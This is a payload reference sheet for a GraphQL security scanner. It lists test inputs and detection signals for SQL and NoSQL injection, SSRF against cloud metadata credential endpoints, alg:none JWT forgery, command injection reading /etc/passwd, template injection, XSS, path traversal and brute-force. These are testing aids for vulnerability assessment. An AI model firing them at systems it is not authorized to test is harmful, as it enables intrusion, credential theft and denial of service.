# Payload Reference — Ultimate GraphQL Scanner

Quick reference for test payloads used in each vulnerability check.

---

## SQL Injection Payloads

Use these in **string-type** input arguments:

```
' OR '1'='1
' OR '1'='1' --
'; DROP TABLE users; --
" OR ""="
1' UNION SELECT null,null,null--
' AND 1=1--
' AND 1=2--
admin'--
1; SELECT * FROM information_schema.tables--
' WAITFOR DELAY '0:0:5'--
```

**Detection signals:**
- SQL error messages (syntax error, unexpected token)
- Different response for `1=1` vs `1=2` (blind SQLi)
- Unexpected data returned
- Response time difference (time-based blind)

---

## NoSQL Injection Payloads

Use these as **object values** where strings are expected:

```json
{"$gt": ""}
{"$ne": null}
{"$ne": "nonexistent"}
{"$regex": ".*"}
{"$exists": true}
{"$where": "1==1"}
```

**Detection signals:**
- Data returned when it shouldn't be
- Different response vs clean input
- Server errors mentioning MongoDB/NoSQL

---

## Query Depth Abuse

Template for nested queries (adapt field names from schema):

```graphql
query DepthTest {
  a: __typename
  user {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    friends {
                      friends {
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Detection signals:**
- Server processes the query without error → vulnerable
- Error about "maximum depth exceeded" → secure

---

## Batch Query Payloads

```json
[
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"},
  {"query": "{ __typename }"}
]
```

**Detection signals:**
- All queries execute → no batch limiting
- Error about batching disabled → secure
- Partial execution with limit → partially secure

---

## Alias-based DoS

Template (adapt `expensiveField` from schema). **Max 20 aliases:**

```graphql
query AliasTest {
  a1: expensiveField { id }
  a2: expensiveField { id }
  a3: expensiveField { id }
  a4: expensiveField { id }
  a5: expensiveField { id }
  a6: expensiveField { id }
  a7: expensiveField { id }
  a8: expensiveField { id }
  a9: expensiveField { id }
  a10: expensiveField { id }
  a11: expensiveField { id }
  a12: expensiveField { id }
  a13: expensiveField { id }
  a14: expensiveField { id }
  a15: expensiveField { id }
  a16: expensiveField { id }
  a17: expensiveField { id }
  a18: expensiveField { id }
  a19: expensiveField { id }
  a20: expensiveField { id }
}
```

---

## Field Suggestion Probing

Send intentionally misspelled queries:

```graphql
{ usr }
{ uzer }
{ pasword }
{ acounts }
{ prodcts }
```

**Detection signals:**
- Response includes "Did you mean 'user'?" → field name leak
- Generic error without suggestions → secure

---

## SSRF Payloads

For URL/URI input fields:

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://100.100.100.200/latest/meta-data/
http://[::ffff:169.254.169.254]/latest/meta-data/
http://localhost:8080/
http://127.0.0.1:3000/
```

---

## Sensitive Field Name Patterns

Regex patterns to detect in schema:

```
password|passwd|pass_hash|password_hash|hashed_password
token|access_token|refresh_token|api_key|apikey|secret
ssn|social_security|tax_id
credit_card|card_number|cvv|cvc
internal_id|debug|admin_flag|is_admin|role
private_key|encryption_key|signing_key
```

---

## Field Duplication Attack

```graphql
query FieldDup {
  <queryName> {
    id id id id id id id id id id
    email email email email email email email email email email
    name name name name name name name name name name
  }
}
```
Max 20 duplicates per field (DoS budget).

---

## Resource Intensive Query

```graphql
query ResourceHeavy {
  <listQuery>(first: 100) {
    id title content createdAt updatedAt
    related { id email name nested { bio } }
  }
}
```
Cap `first`/`limit` at 100 (DoS budget).

---

## JWT Token Forge

`alg:none` forged token pattern (header.payload. empty sig):

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```

Use with the discovered current-user / profile query:
```graphql
query { <currentUserQuery> { id email role } }
```
Header: `Authorization: Bearer <forged>`

---

## Code Execution

```graphql
mutation { <dangerousMutation>(command: "id") { <fields> } }
mutation { <dangerousMutation>(command: "whoami") { <fields> } }
mutation { <dangerousMutation>(command: "cat /etc/passwd") { <fields> } }
```

---

## Command Injection (generic string args)

```
; id
| id
$(id)
`id`
& whoami
```

---

## SSTI / Template Injection

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{{config}}
{{self}}
```

---

## Mass Assignment extras

```
role: "admin"
isAdmin: true
permissions: ["*"]
verified: true
balance: 999999
```

---

## Auth Brute-force via Alias (≤20) / Batch (≤10)

```graphql
mutation {
  a1: <loginMutation>(email: "admin@target.com", password: "admin") { token }
  a2: <loginMutation>(email: "admin@target.com", password: "password") { token }
  a3: <loginMutation>(email: "admin@target.com", password: "123456") { token }
}
```

Tiny password list only (≤10). Do not run large dictionaries.

---

## `__type` Partial Leak

```graphql
{ __type(name: "Query") { name fields { name } } }
{ __type(name: "Mutation") { name fields { name } } }
{ __type(name: "User") { name fields { name type { name kind } } } }
{ __schema { queryType { name } mutationType { name } } }
```

---

## Stored XSS / HTML Injection

```
<script>alert('xss')</script>
"><img src=x onerror=alert(1)>
<h1>injected</h1><iframe src="http://evil"></iframe>
javascript:alert(1)
```

```graphql
mutation {
  <contentMutation>(content: "<script>alert('xss')</script>") { id content html }
}
```

---

## Log Injection / Log Spoofing

```
victim@example.com\n[ERROR] Fake successful admin login
test\r\nINFO: privilege escalation granted
%0a%0d[CRITICAL] auth bypass
```

---

## Path Traversal

```
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
/etc/passwd
C:\\Windows\\win.ini
```

```graphql
mutation {
  <fileMutation>(path: "../../../etc/passwd", content: "x") { id path url }
}
```

---

## Weak Password / Hash Exposure

Weak passwords to try on register/signup:
```
123456
password
admin
qwerty
letmein
```

Fields that indicate hash exposure if returned:
```
password passwordHash hashedPassword pass_hash hash salt
```

---

## GraphQL IDE / Voyager Paths (Check 45)

On the given endpoint's host, check for exposed dev tooling:
```
/graphiql   /graphql/playground   /playground   /voyager   /graphql/voyager
```

---

## Introspection Bypass Variations

```graphql
# newline/whitespace inside __schema
{"query":"query{__schema\n{queryType{name}}}"}

# fragment-wrapped introspection
{"query":"{...I} fragment I on Query{__schema{queryType{name}}}"}

# __type when __schema is blocked
{"query":"{__type(name:\"Query\"){fields{name}}}"}
```
Also try GET, `Content-Type: application/graphql`, and `application/x-www-form-urlencoded`.

---

## Clairvoyance-style Field Suggestion Fuzzing

Submit guesses, harvest "Did you mean …?" and recurse:
```graphql
{ usr } { uzr } { pasword } { acount } { prodct } { admn }
```
Reconstruct schema from suggestions; also pull field/operation names from JS bundles.

---

## Nested / Field-Level Authorization (BOLA/BFLA)

Traverse relationships to reach data the top-level query gates but the nested resolver does not:
```graphql
query {
  <objectQuery>(id: "<otherUsersId>") {
    id
    owner { id email }
    customer { id email paymentMethods { last4 } }
    relatedItems { id secretField }
  }
}
```
BFLA — call sensitive mutations with a low-priv token:
```graphql
mutation { <adminMutation>(id: "1") { id } }
```
Remember: `{"errors":[{"message":"Not authorized"}]}` = enforced, not bypassed.

---

## WebSocket Subscription (graphql-ws / graphql-transport-ws)

```
# connection_init then subscribe — test no token / expired / other-user token
{"type":"connection_init","payload":{"Authorization":"Bearer <token>"}}
{"type":"subscribe","id":"1","payload":{"query":"subscription { <field> { id } }"}}
```
Cross-site WS hijacking: repeat the handshake with a foreign `Origin` header while relying on cookies.

---

## N+1 / Complexity Amplification

```graphql
# N+1: nested relation per item — measure time vs flat query
query { <listQuery>(first: 100) { id <relation> { id } } }

# under-depth-limit but expensive (wide + moderate relations)
query { <listQuery>(first: 100) { id a b c d e related { id a b c } } }

# fragment-spread amplification (≤5 depth, ≤20 spreads — DoS budget)
query { <q> { ...F ...F ...F } }
fragment F on <T> { id name related { id name } }
```
